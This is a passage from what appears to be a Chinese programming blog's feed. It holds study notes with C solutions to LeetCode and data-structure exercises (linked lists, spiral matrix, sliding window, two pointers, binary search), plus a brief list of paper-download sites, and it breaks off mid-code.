a-&gt;next-&gt;val;</span><br><span class="line">        a-&gt;next = a-&gt;next-&gt;next;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    LiStack l = (LiStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LiStack));</span><br><span class="line">    init_List(l);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        push(l,i);</span><br><span class="line">   </span><br><span class="line">    pop(l);</span><br><span class="line">    </span><br><span class="line">    Lnode *p = l-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,p-&gt;val);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>注意到上面的代码我在所有的函数调用中都没有在<code>LiStack a</code>的a前加<code>*</code>号，因为我使用的是带有<strong>头结点</strong>的链栈，头结点的地址（指针本身）不发生变化，只改变链栈中的内容，不需要加<code>*</code>号；如果<strong>不带头结点</strong>，且使用头插法，则每次插入/删除一个元素都需要改变第一个结点的指针本身，这时就需要使用<code>*</code>号使得函数调用中能同步修改主函数中的头指针。</p><p>参考：https://www.zhihu.com/tardis/zm/art/421431276?source_id=1005</p>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移除链表元素</title>
    <link href="/2024/01/09/%E7%A7%BB%E9%99%A4%E9%93%BE%E8%A1%A8%E5%85%83%E7%B4%A0/"/>
    <url>/2024/01/09/%E7%A7%BB%E9%99%A4%E9%93%BE%E8%A1%A8%E5%85%83%E7%B4%A0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/remove-linked-list-elements/</p><blockquote><p>注意题目中的头节点就是指首元结点，即指针<code>head</code>指向的节点存储数据；</p><p>而408中的头节点不存储数据</p></blockquote><p>该题有两种解决方案：</p><ol type="1"><li>直接从首元节点开始遍历，删除节点（分为：头节点的删除与中间节点的删除）</li><li>定义一个虚拟头节点<code>vhead</code>，不存放数据，<code>vhead-&gt;next</code>指向<code>head</code></li></ol><p>我使用的是第二种方案，不需要考虑两种节点的删除，一步到位</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeElements</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> val)</span> {</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> <span class="title">ListNode</span>;</span></span><br><span class="line">    ListNode *vhead;        <span class="comment">//定义虚拟头节点指针</span></span><br><span class="line">    vhead = (ListNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ListNode));  <span class="comment">//分配虚拟头节点空间</span></span><br><span class="line">    vhead-&gt;next = head;     <span class="comment">//将虚拟头节点放在首元结点之前</span></span><br><span class="line">    ListNode *p = vhead;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>) {  <span class="comment">//第一次循环 p-&gt;next 即为 head</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;next-&gt;val == val) {</span><br><span class="line">            ListNode *del = p-&gt;next;     <span class="comment">//记录要删除的节点</span></span><br><span class="line">            p-&gt;next = p-&gt;next-&gt;next;     </span><br><span class="line">            <span class="built_in">free</span>(del);                   <span class="comment">//释放待删除节点的内存</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    head = vhead-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(vhead);            <span class="comment">//注意别忘了删除虚拟头节点</span></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>螺旋矩阵Ⅱ</title>
    <link href="/2024/01/05/%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/"/>
    <url>/2024/01/05/%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/spiral-matrix-ii/</p><p>这题需要模拟矩阵的旋转：</p><ul><li>先从左往右</li><li>然后从上往下</li><li>接着从右往左</li><li>最后从下往上</li></ul><blockquote><p>注：这里的步骤其实是n为偶数时的情况，n为奇数时，最后一个数(矩阵中间位置)需要单独赋值</p></blockquote><p>使用<strong>左闭右开</strong>（即包含当前方向上的第一个元素，不包括当前方向上的最后一个元素，如下图所示）比较方便，这样每个方向的代码都是类似的</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202401051359392.png"></p><blockquote><p>这题我是用C语言写的，理解<code>returnSize</code>和<code>returnColumnSizes</code>这两个参数我花了不少时间。（注：这里斜体的<em>一维数组</em>是指<strong>结果数组</strong>中的<em>一维数组</em>）</p><ul><li><code>*returnSize</code>：<strong>结果数组</strong>的大小(即该二维数组中<em>一维数组</em>的个数)——具体的<strong>值</strong></li><li><code>*returnColumnSizes</code>：表示一维数组的<strong>地址</strong>，该一维数组存放的是上述<strong>结果数组</strong>中每个<em>一维数组</em>元素的个数</li><li><code>(*returnColumnSizes)[i]</code>：一维数组的元素，该元素是指<strong>结果数组</strong>中第<strong>i</strong>个<em>一维数组</em>的元素个数</li></ul></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>** <span class="title function_">generateMatrix</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    <span class="type">int</span> count = <span class="number">1</span>;         <span class="comment">//记录当前填入矩阵的值</span></span><br><span class="line">    <span class="type">int</span> offset = <span class="number">1</span>;        <span class="comment">//偏移量，控制左闭右开的区间</span></span><br><span class="line">    <span class="type">int</span> circle = <span class="number">0</span>;        <span class="comment">//循环的次数</span></span><br><span class="line">    *returnSize = n;       <span class="comment">//结果数组中的一维数组个数为n</span></span><br><span class="line">    *returnColumnSizes = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n); <span class="comment">//这里的*returnColumnSizes是一个指向一维数组的指针，需要分配空间</span></span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>;               <span class="comment">//记录模拟过程中所在的行</span></span><br><span class="line">    <span class="type">int</span> y=<span class="number">0</span>;               <span class="comment">//记录模拟过程中所在的列</span></span><br><span class="line">    <span class="type">int</span> **ans = (<span class="type">int</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span> *) * n);   <span class="comment">//结果数组</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++){</span><br><span class="line">        ans[i] = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n);  <span class="comment">//要另外给结果数组的每个元素(一维数组)分配空间</span></span><br><span class="line">        (*returnColumnSizes)[i] = n;     <span class="comment">//结果数组的每个一维数组中的元素个数为n</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span>(circle &lt; n/<span class="number">2</span>) {   <span class="comment">//一次循环少两行，所以n/2为循环次数</span></span><br><span class="line">        x = circle;        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=offset<span class="number">-1</span>; j &lt; n-offset; j++) {  <span class="comment">//从左往右</span></span><br><span class="line">            ans[x][j] = count++;</span><br><span class="line">        }  <span class="comment">//注意这里的offset，每一次循环后，左边少一列，右边也少一列，下面同理</span></span><br><span class="line"></span><br><span class="line">        y = n-circle<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=offset<span class="number">-1</span>; i&lt;n-offset; i++) {    <span class="comment">//从上往下</span></span><br><span class="line">            ans[i][y] = count++;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        x = n-circle<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=n-offset; j &gt; offset<span class="number">-1</span>; j--) {  <span class="comment">//从右往左</span></span><br><span class="line">            ans[x][j] = count++;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        y = circle;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n-offset; i &gt; offset<span class="number">-1</span>; i--) {  <span class="comment">//从下往上</span></span><br><span class="line">            ans[i][y] = count++;</span><br><span class="line">        }</span><br><span class="line">        offset++;</span><br><span class="line">        circle++;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>!=<span class="number">0</span>)      <span class="comment">//当n为奇数时，中间位置需要另外单独赋值</span></span><br><span class="line">        ans[n/<span class="number">2</span>][n/<span class="number">2</span>] = count;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文献下载途径</title>
    <link href="/2024/01/05/%E6%96%87%E7%8C%AE%E4%B8%8B%E8%BD%BD/"/>
    <url>/2024/01/05/%E6%96%87%E7%8C%AE%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>文献下载：</p><ul><li><p>doi</p><blockquote><p><strong>数字对象（唯一）标识符</strong>（英语：digital objectidentifier，简称DOI）又称<strong>数字对象识别符</strong>，是用于唯一地标识对象（数位资源）的持久标识符或句柄，由国际标准化组织标准化。涵括的对象有影片、报告或书籍等。它既有一套为资源命名的机制，也有一套将识别号解析为具体地址的协议。</p></blockquote></li><li><p>谷歌学术</p></li><li><p>知网</p></li><li><p>sci-hub</p></li><li><p>ResearchGate</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>文献</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文献</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>长度最小的子数组</title>
    <link href="/2024/01/02/LeetCode%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    <url>/2024/01/02/LeetCode%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/minimum-size-subarray-sum/</p><p><strong>滑动窗口</strong>算是<strong>双指针</strong>的一种，可以类比计算机网络里的滑动窗口。</p><p>主要的思想是：从<strong>A[i]</strong>开始，向后遍历找到满足条件的最小长度；若能找到，分析可知以<strong>A[i]</strong>开始的窗口大小只有这一个最小值，然后寻找以<strong>A[i+1]</strong>开始的最小长度。</p><ul><li>初始时，左、右指针指向数组下标为0的元素，窗口大小为最大正整数</li><li>右指针右移，比较当前窗口中元素之和与目标值的大小：<ol type="1"><li>若大于等于target，且当前窗口小于之前的值，则更新窗口大小，同时左指针右移，直到窗口里元素之和小于target</li><li>否则，右指针继续后移</li></ol></li><li>最后比较窗口大小是否等于最大正整数，若等于，则说明不存在符合条件的子数组，返回0；否则返回窗口大小</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="type">int</span> result = INT_MAX;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>; <span class="comment">//记录当前滑动窗口大小</span></span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>; <span class="comment">//左指针</span></span><br><span class="line">    <span class="type">int</span> r = <span class="number">0</span>; <span class="comment">//右指针</span></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>; <span class="comment">//记录元素相加之和</span></span><br><span class="line">    <span class="keyword">for</span>(r; r &lt; numsSize; r++) {</span><br><span class="line">        sum += nums[r];</span><br><span class="line">        <span class="keyword">while</span>(sum &gt;= target) {</span><br><span class="line">            len = r-l+<span class="number">1</span>;  <span class="comment">//当前窗口大小</span></span><br><span class="line">            result = len &lt; result ? len : result;  <span class="comment">//判断是否更新最小窗口值</span></span><br><span class="line">            sum -= nums[l];</span><br><span class="line">            l++;   <span class="comment">//左指针右移</span></span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result == INT_MAX ? <span class="number">0</span> : result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这里虽然使用了<code>while</code>，但时间复杂度还是O(n)，不是O(n<sup>2</sup>)</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有序数组的平方</title>
    <link href="/2023/12/31/%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E5%B9%B3%E6%96%B9/"/>
    <url>/2023/12/31/%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E5%B9%B3%E6%96%B9/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/squares-of-a-sorted-array/</p><p>这题可直接暴力求解，即将每个元素平方后排序（快速排序），时间复杂度为<strong>O(nlogn)</strong>；</p><p>更好的方法是使用<strong>双指针</strong>的思想，由于数组为非递减有序数组，所以平方后的最大值一定在数组两端：</p><ul><li>初始时，左指针指向数组初始位置，右指针指向末尾元素</li><li>比较两个指针指向元素平方后的大小，将较大的值存入新数组中</li><li>若左指针指向元素较大，左指针右移；若右指针指向元素较大，右指针左移</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">sortedSquares</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    *returnSize = numsSize;  <span class="comment">//returnSize指向元素的大小和numsSize相同</span></span><br><span class="line">    <span class="type">int</span> *s = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*numsSize);</span><br><span class="line">    <span class="type">int</span> l=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> r=numsSize<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> k=numsSize<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;=r) {</span><br><span class="line">        <span class="keyword">if</span>(nums[l]*nums[l] &gt; nums[r]*nums[r]) {</span><br><span class="line">            s[k] = nums[l]*nums[l];</span><br><span class="line">            l++;    <span class="comment">//若左指针指向元素较大，左指针右移</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            s[k] = nums[r]*nums[r];</span><br><span class="line">            r--;    <span class="comment">//若右指针指向元素较大，右指针左移</span></span><br><span class="line">        }</span><br><span class="line">        k--;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移动零</title>
    <link href="/2023/12/31/%E7%A7%BB%E5%8A%A8%E9%9B%B6/"/>
    <url>/2023/12/31/%E7%A7%BB%E5%8A%A8%E9%9B%B6/</url>
    
    <content type="html"><![CDATA[<p>这题用<strong>双指针+交换数值</strong>的方法：</p><ul><li><p>初始时，快、慢指针同时指向nums[0]</p></li><li><p>若快指针当前指向的元素不为0，则与慢指针指向的元素交换位置，快、慢指针均后移</p><blockquote><p>这里分为两种情况：</p><ol type="1"><li>快、慢指针指向同一非零元素，则交换元素不改变该元素位置</li><li>慢指针指向数值为<strong>0</strong>的元素，快指针指向非零元素，然后交换位置</li></ol></blockquote></li><li><p>若快指针当前指向元素为<strong>0</strong>，则只向后移快指针</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span>{ <span class="comment">//传入a、b的地址（实质上函数创建了a、b地址的副本pa和pb）</span></span><br><span class="line">    <span class="type">int</span> t = *a;  <span class="comment">//将a指向的变量数值赋给中间变量t</span></span><br><span class="line">    *a = *b;     <span class="comment">//将b指向的变量数值赋给a指向的变量</span></span><br><span class="line">    *b = t;      <span class="comment">//将中间变量t的值赋给b指向的变量</span></span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">moveZeroes</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="type">int</span> slow = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> fast=<span class="number">0</span>; fast&lt;numsSize; fast++){</span><br><span class="line">        <span class="keyword">if</span>(nums[fast] != <span class="number">0</span>){</span><br><span class="line">            swap(&amp;nums[slow], &amp;nums[fast]);  <span class="comment">//交换位置</span></span><br><span class="line">            slow++;  <span class="comment">//慢指针后移</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下面是我自己的做法，这题我自己的做法不太严谨，我是先将非零元素移至数组左边，右边元素覆盖为0，这种情况下元素移动次数不是最少，不如上面的方法</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">moveZeroes</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span> {</span><br><span class="line">    <span class="type">int</span> slow = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> fast=<span class="number">0</span>; fast&lt;numsSize; fast++){</span><br><span class="line">        <span class="keyword">if</span>(nums[fast] != <span class="number">0</span>)</span><br><span class="line">            nums[slow++] = nums[fast];   <span class="comment">//移动元素</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=slow; i&lt;numsSize; i++)</span><br><span class="line">        nums[i]=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>移除元素（双指针）</title>
    <link href="/2023/12/30/%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0/"/>
    <url>/2023/12/30/%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/remove-element/</p><p>本题使用双指针的思想（本题可理解为<strong>数组下标</strong>）</p><ul><li>初始时，快、慢指针均指向数组第一个元素；</li><li>若当前快指针指向的元素<strong>不是</strong>待移除的元素时，两个指针<strong>同时移动</strong>，且将快指针指向的元素赋值给慢指针指向的数组元素(即移动元素)；</li><li>快指针指向的元素<strong>是</strong>待移除的元素时，慢指针不动，快指针移动</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> val)</span> {</span><br><span class="line">    <span class="type">int</span> fast; <span class="comment">//快指针</span></span><br><span class="line">    <span class="type">int</span> slow = <span class="number">0</span>; <span class="comment">//慢指针</span></span><br><span class="line">    <span class="keyword">for</span>(fast=<span class="number">0</span>; fast&lt;numsSize; fast++){</span><br><span class="line">        <span class="keyword">if</span>(nums[fast] != val){ <span class="comment">//不是待移除元素，则同时移动两指针</span></span><br><span class="line">            nums[slow++] = nums[fast];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下面是我自己的做法，比较繁琐<span class="github-emoji"><span>😅</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f605.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> val)</span> {</span><br><span class="line">    <span class="type">int</span> slow=<span class="number">0</span>; <span class="comment">//慢指针</span></span><br><span class="line">    <span class="type">int</span> fast;</span><br><span class="line">    <span class="type">int</span> length = numsSize; <span class="comment">//记录新数组长度</span></span><br><span class="line">    <span class="keyword">for</span>(fast=<span class="number">0</span>; fast&lt;numsSize;){</span><br><span class="line">        <span class="keyword">if</span>(nums[fast] == val){</span><br><span class="line">            <span class="comment">//若待移除元素不是数组结尾元素，则需要移动元素</span></span><br><span class="line">            <span class="keyword">if</span>((++fast)&lt;numsSize) <span class="comment">//防止溢出，同时移动快指针</span></span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">            length--; <span class="comment">//移除元素，数组长度减小</span></span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">//不移动慢指针，只移动快指针</span></span><br><span class="line">        }</span><br><span class="line">        nums[slow] = nums[fast];</span><br><span class="line">        fast++;</span><br><span class="line">        slow++;  <span class="comment">//若不是待移除元素，则同时移动两指针</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>相关题目：<a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/">删除排序数组中的重复项</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x的平方根</title>
    <link href="/2023/12/30/x%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/"/>
    <url>/2023/12/30/x%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/sqrtx/</p><p>这道题也是二分查找相关题目</p><p>由题目可知 <em>x</em> 平方根的<strong>整数部分</strong> <em>ans</em>是<strong>满足 ans<sup>2</sup> ≤ x </strong>。下面分析用二分法求解<em>k</em> 值。</p><p>根据 <em>x</em> 开方后是否是整数分为两种情况：</p><ul><li><p>能找到一个整数 <strong>k</strong> 使得 <strong>k<sup>2</sup>&lt;= x</strong>，使用二分法一定能找到该整数</p></li><li><p><em>x</em> 平方根 <strong>k</strong> 为浮点数，且<strong>k ∈ (n,n+1)</strong>，其中<strong>n</strong>为整数，所以<strong>k</strong>的整数部分<strong>ans</strong>即为<strong>n</strong></p><blockquote><p>因此需要在<code>if</code>判断语句中不断更新<strong>ans</strong>的值，使其取得更大的值；若是在<code>while</code>循环结束时才给<strong>ans</strong>赋值，则可能会导致<strong>ans</strong>等于<strong>n+1</strong></p><p>注意：<code>mid</code>的数据类型应为<strong>long</strong>，防溢出（x的范围是 0 ~ 2<sup>31</sup>-1）</p></blockquote></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>; 